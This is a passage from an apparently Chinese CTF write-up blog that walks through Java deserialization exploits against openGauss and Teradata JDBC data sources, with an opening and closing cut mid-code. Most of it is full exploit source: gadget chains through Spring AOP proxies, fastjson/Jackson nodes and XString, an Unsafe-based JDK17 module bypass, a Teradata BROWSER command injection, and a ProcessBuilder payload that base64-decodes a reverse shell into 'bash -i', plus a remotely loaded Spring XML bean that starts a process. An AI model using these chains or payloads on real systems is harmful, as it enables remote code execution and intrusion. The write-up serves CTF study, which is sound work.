com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> cn.openGauss.WebApp.user.admin;<br><br><span class="hljs-comment">//import com.huawei.shade.com.alibaba.fastjson.JSONArray;</span><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> org.opengauss.ds.PGSimpleDataSource;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.PgTest.getDataSource;</span><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.Utils.*;</span><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenGaussTest</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">admin</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tangosol.coherence.mvel2.sh.ShellSession&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;).start()&quot;</span>;<br><br><span class="hljs-comment">//        String className = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="hljs-comment">//        String myargs = &quot;http://localhost:7788/exp.xml&quot;;</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br><span class="hljs-comment">//        ((DataSource)dataSource).getConnection();</span><br><span class="hljs-comment">//        Object proxy = getProxy(user, DataSource.class);</span><br><span class="hljs-comment">//        Object exp = getBadAttr(proxy);</span><br><span class="hljs-comment">//        Object exp = getXstringMap(user);</span><br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(dataSource, DataSource.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> base64Serialize(exp);<br>        base64Deserialize(b);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><span class="hljs-comment">//        CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="hljs-comment">//        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="hljs-comment">//        ctClass.removeMethod(writeReplace);</span><br><span class="hljs-comment">//        ctClass.toClass();</span><br><span class="hljs-comment">//        POJONode node = new POJONode(obj);</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        node.add(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBadAttr</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>自行补充那几个方法就可以了，可以直接用fj的平替。</p><p>还涉及一个JVM的vm-options操作，不然是不能直接调用XString的，而且pom里还需要build特定的东西，不然还是会找不到包（满满的坑）。</p><p>setFieldValue不能直接写简单的反射，应该要做到递归调用父类方法，不然也是调用不到setProperty方法。</p><p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>同理可通，出网随便打：</p><p><code>exp.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150053269.png" alt="image-20240923150053269"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150000954.png" alt="image-20240923150000954"></p><p>学长的挖掘链方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923145854643.png" alt="image-20240923145854643"></p><h2 id="2024DubheCTF-Javolution"><a href="#2024DubheCTF-Javolution" class="headerlink" title="2024DubheCTF-Javolution"></a>2024DubheCTF-Javolution</h2><p>欧阳学长出的题，真的质量很高啊。</p><p>其实这道跟上面ccb那道有地方逻辑很像，也是用JDBC来打，这里的数据库变成了Teradata，不同的点在于，代码会真的对数据库发起一次连接，所以必须真的搭一个Teradata数据库，或者写一个Teradata的fakeserver。</p><p>当然，天无绝人之路，确实有现成的：</p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">luelueking&#x2F;Deserial_Sink_With_JDBC: Some ReadObject Sink With JDBC (github.com)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151533033.png" alt="image-20240923151533033"></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>攻击方法来自：<a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf (blackhat.com)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151718933.png" alt="image-20240923151718933"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151754193.png" alt="image-20240923151754193"></p><p>题目前面是一个负数溢出的绕过，以及最后套一个SSRF，域名要包含dubhe，<code>sudo.cc</code>本就是执行<code>localhost</code>的，所以<code>dubhe.sudo.cc</code>即可。就不详细写了。我们把重心放到后面jdk17的jdbc攻击上。</p><p>JVM参数设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">--add-opens java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED<br></code></pre></td></tr></table></figure><p>但是难绷的是，我自己复现怎么都连不上这个fakeserver的数据库，导致payload出不来，一直找不到方法，作罢。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923163621149.png" alt="image-20240923163621149"></p><hr><p>new:解决这个问题了，fakeserver上放fakesso的ip只放127.0.0.1而不是vps_ip导致的，笑拉了。</p><p>Gadget-Chains可以慢慢跟出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">TeraDataSourceBase.createNewConnection –&gt; ConnectionFactory.createConnection <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawConnection</span> —&gt; <br>RawConnection构造函数引用父类构造GenericTeradataConnection —&gt; GenericTeradataConnection构造函数—&gt;<br>Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927202643136.png" alt="image-20240927202643136"></p><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><p>怎么打都随便通啊。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraDataSource;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraDataSourceBase;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraPooledConnection;<br><span class="hljs-comment">//import org.assertj.core.util.xml.XmlStringPrettyFormatter;</span><br><span class="hljs-keyword">import</span> org.dubhe.javolution.pool.PalDataSource;<br><span class="hljs-comment">//import org.mockito.internal.matchers.Equals;</span><br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        com.sun.org.apache.xpath.internal.objects.XString</span><br>        <span class="hljs-comment">// --add-opens java.xml/com.sun.org.apache.xpath.internal=ALL-UNNAMED</span><br>        <span class="hljs-keyword">final</span> ArrayList&lt;Class&gt; classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.Properties&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.teradata.jdbc.TeraDataSource&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>));<br><span class="hljs-comment">//        classes.add(Class.forName(&quot;java.xml.*&quot;));</span><br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exp2</span>().bypassModule(classes);<br><br>        <span class="hljs-type">TeraDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PalDataSource</span>();<br>        <span class="hljs-comment">//dataSource.setBROWSER(&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br>        dataSource.setBROWSER(<span class="hljs-string">&quot;calc&quot;</span>);<br>        dataSource.setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);<br>        dataSource.setDSName(<span class="hljs-string">&quot;vps&quot;</span>);<br>        dataSource.setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> dataSource.getClass().getModule();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> PriorityQueue.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.putObject(currentClass, offset, baseModule);<br><br>        Class&lt;?&gt; clazz =<br>                Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(dataSource);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)<br>                cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]<br>                &#123;DataSource.class&#125;, handler);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);<br><br><span class="hljs-comment">//        POJONode pojoNode = new POJONode(dataSource);</span><br><span class="hljs-comment">//        pojoNode.toString();</span><br><br>        <span class="hljs-comment">// com.sun.org.apache.xpath.internal.objects</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(xString,pojoNode);<br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object obj1, Object obj2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(obj2);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(obj1);<br><br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFiledValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFiledValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiledValue</span><span class="hljs-params">(Object obj, String key, Object val)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Field field ;<br>        <span class="hljs-keyword">try</span>&#123;<br>            field = obj.getClass().getDeclaredField(key);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            <span class="hljs-keyword">if</span> (obj.getClass().getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = obj.getClass().getSuperclass().getDeclaredField(key);<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,val);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));</span><br>        <span class="hljs-comment">//oos.writeObject(obj);</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    